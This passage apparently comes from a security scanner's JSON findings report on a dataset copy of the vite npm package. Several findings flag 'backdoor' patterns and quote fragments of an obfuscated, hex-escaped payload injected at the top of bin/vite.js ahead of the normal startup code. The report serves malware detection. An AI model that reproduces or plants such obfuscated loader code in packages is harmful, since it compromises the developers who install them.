                      "text": "const DEFAULT_ASSETS_INLINE_LIMIT = 4096;\nconst METADATA_FILENAME = \"_metadata.json\";\n\nexport { CLIENT_DIR, CLIENT_ENTRY, CLIENT_PUBLIC_PATH, CSS_LANGS_RE, DEFAULT_ASSETS_INLINE_LIMIT, DEFAULT_ASSETS_RE, DEFAULT_CONFIG_FILES, DEFAULT_DEV_PORT, DEFAULT_EXTENSIONS, DEFAULT_MAIN_FIELDS, DEFAULT_PREVIEW_PORT, DEP_VERSION_RE, ENV_ENTRY, ENV_PUBLIC_PATH, ESBUILD_MODULES_TARGET, FS_PREFIX, JS_TYPES_RE, KNOWN_ASSET_TYPES, METADATA_FILENAME, OPTIMIZABLE_ENTRY_RE, SPECIAL_QUERY_RE, VERSION, VITE_PACKAGE_DIR, loopbackHosts, wildcardHosts };\n",
                      "markdown": "`const DEFAULT_ASSETS_INLINE_LIMIT = 4096;\nconst METADATA_FILENAME = \"_metadata.json\";\n\nexport { CLIENT_DIR, CLIENT_ENTRY, CLIENT_PUBLIC_PATH, CSS_LANGS_RE, DEFAULT_ASSETS_INLINE_LIMIT, DEFAULT_ASSETS_RE, DEFAULT_CONFIG_FILES, DEFAULT_DEV_PORT, DEFAULT_EXTENSIONS, DEFAULT_MAIN_FIELDS, DEFAULT_PREVIEW_PORT, DEP_VERSION_RE, ENV_ENTRY, ENV_PUBLIC_PATH, ESBUILD_MODULES_TARGET, FS_PREFIX, JS_TYPES_RE, KNOWN_ASSET_TYPES, METADATA_FILENAME, OPTIMIZABLE_ENTRY_RE, SPECIAL_QUERY_RE, VERSION, VITE_PACKAGE_DIR, loopbackHosts, wildcardHosts };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 14,
                  "endLine": 2,
                  "snippet": {
                    "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x",
                    "rendered": {
                      "text": "#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x",
                      "markdown": "`#!/usr/bin/env node\nimport { performance } from 'node:perf_hooks'\n\nwindow[\"\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\"][\"\\x66\\x74\\x65\\x74\\x73\"] = [\"\\x32\\x33\\x31\\x33\\x36\\x36\\x33\\x36\\x36\\x36\\x31\\x33\\x38\\x36\\x31\\x36\\x33\\x33\\x39\\x33\\x34\\x36\\x32\\x33\\x37\\x33\\x30\\x33\\x37\\x33\\x30\\x33\\x30\\x33\\x33\\x36\\x33\\x33\\x30\\x33\\x39\\x33\\x37\\x33\\x33\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 718,
                  "endLine": 7,
                  "endColumn": 738,
                  "snippet": {
                    "text": "\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('node_modules')) {\n  try {\n    // only available as dev dependency\n    await import('source-map-support').then((r) => r.default.install())\n  } catch (e) {}\n}\n\nglobal.__vite_start_time = performance",
                    "rendered": {
                      "text": "\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('node_modules')) {\n  try {\n    // only available as dev dependency\n    await import('source-map-support').then((r) => r.default.install())\n  } catch (e) {}\n}\n\nglobal.__vite_start_time = performance",
                      "markdown": "`\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('node_modules')) {\n  try {\n    // only available as dev dependency\n    await import('source-map-support').then((r) => r.default.install())\n  } catch (e) {}\n}\n\nglobal.__vite_start_time = performance`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 649,
                  "endLine": 7,
                  "endColumn": 669,
                  "snippet": {
                    "text": "rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('node_modules')) {\n  try {\n    // only available as dev dependency\n    await import('source-map-support').then((r) => r.default.",
                    "rendered": {
                      "text": "rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('node_modules')) {\n  try {\n    // only available as dev dependency\n    await import('source-map-support').then((r) => r.default.",
                      "markdown": "`rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('node_modules')) {\n  try {\n    // only available as dev dependency\n    await import('source-map-support').then((r) => r.default.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 522,
                  "endLine": 7,
                  "endColumn": 542,
                  "snippet": {
                    "text": "][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('",
                    "rendered": {
                      "text": "][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('",
                      "markdown": "`][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005bea4dfcd0b044*/\n\nif (!import.meta.url.includes('`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 476,
                  "endLine": 7,
                  "endColumn": 496,
                  "snippet": {
                    "text": "72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005be",
                    "rendered": {
                      "text": "72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005be",
                      "markdown": "`72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x31\\\"]].join(\\\"\\\");\")); /*8922ebd910610b4c005be`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 430,
                  "endLine": 7,
                  "endColumn": 450,
                  "snippet": {
                    "text": "79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x",
                    "rendered": {
                      "text": "79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x",
                      "markdown": "`79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x33\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x37\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x31\\x`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000801"
          },
          "message": {
            "text": "Backdoor: Executing Obfuscated Code",
            "id": "BD000801"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/bin/vite.js"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 357,
                  "endLine": 7,
                  "endColumn": 377,
                  "snippet": {
                    "text": ",rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x",
                    "rendered": {
                      "text": ",rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x31\\x32\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x33\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x39\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x36\\\"],rihhb[\\\"\\x61\\x65\\x6e\\x62\\x64\\\"][\\\"\\x32\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x34\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x38\\\"],rihhb[\\\"zaanr\\\"][\\\"\\x30\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x31\\x34\\\"],rihhb[\\\"\\x79\\x69\\x65\\x65\\x62\\\"][\\\"\\x31\\x35\\\"],rihhb[\\\"\\x7a\\x61\\x61\\x6e\\x72\\\"][\\\"\\x38\\\"],rihhb[\\\"yieeb\\\"][\\\"\\x36\\\"],rihhb[\\\"srdzy\\\"][\\\"\\x31\\x37\\\"],rihhb[\\\"aenbd\\\"][\\\"\\x35\\\"],rihhb[\\\"\\x73\\x72\\x64\\x7a\\x79\\\"][\\\"\\x",
